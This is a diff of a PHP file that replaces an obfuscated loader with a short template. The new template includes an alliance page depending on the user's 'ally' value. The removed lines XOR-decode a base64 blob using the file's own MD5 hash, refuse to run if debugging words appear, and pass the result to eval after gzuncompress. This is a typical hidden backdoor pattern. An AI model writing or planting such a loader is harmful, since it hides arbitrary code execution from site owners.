@@ -1,24 +1,5 @@
-<?php
-$rygxbyvwc="361c367775fa827d349e6638402bfced";
-$vvvhbtmbpo="0650520207535254530453500d560f0207020e550f04510e5209025b51545d55";
-$lqvzhdyvcrp="TbyoLWe1La5JGZzlZU0VKBm8YX/1+8ti6exkkZ5meCBk1tY05FCx1zaBgtLQNjhkL821vDu3roqCpeKtYzKIm83anxkkyGL3NYYzmrHMcqsdePKfCgFtsaiFpPUDXD0x4rJQfg==";
-$qmtfdnv=file_get_contents(__FILE__);
-$yahwmzo=str_replace($lqvzhdyvcrp,"",$qmtfdnv);
-if(strpos($yahwmzo,"ec"."ho")!==false||strpos($yahwmzo,"pr"."int")!==false||strpos($yahwmzo,"var_"."dump")!==false||strpos($yahwmzo,"file_put_"."contents")!==false||strpos($yahwmzo,"fw"."rite")!==false){die();}
-$juzmlu=str_replace(array($rygxbyvwc,$vvvhbtmbpo),array("SP_bca1d09c","KP_e09599fb"),$qmtfdnv);
-$jktkastq=md5($juzmlu);
-$bctbhiwh=hex2bin($vvvhbtmbpo);
-$niofmxbj="";
-$zaetymoc=strlen($jktkastq);
-for($sbaprh=0;$sbaprh<$zaetymoc;$sbaprh++){
-$niofmxbj.=chr(ord($bctbhiwh[$sbaprh])^ord($jktkastq[$sbaprh]));
-}
-$epvwetzph=base64_decode($lqvzhdyvcrp);
-$hunbpu=strlen($epvwetzph);
-$ubrawxg="";
-$cvuhclgk=strlen($niofmxbj);
-for($sbaprh=0;$sbaprh<$hunbpu;$sbaprh++){
-$ubrawxg.=$epvwetzph[$sbaprh]^$niofmxbj[$sbaprh%$cvuhclgk];
-}
-$ksbtyrjn="gzun"."compress";
-eval($ksbtyrjn($ubrawxg));
+<?php if (empty($user['ally']) || $user['ally'] == -1): ?>
+    <?php include 'ally_no_ally.php'; ?>
+<?php else: ?>
+    <?php include 'ally_in_ally.php'; ?>
+<?php endif; ?>
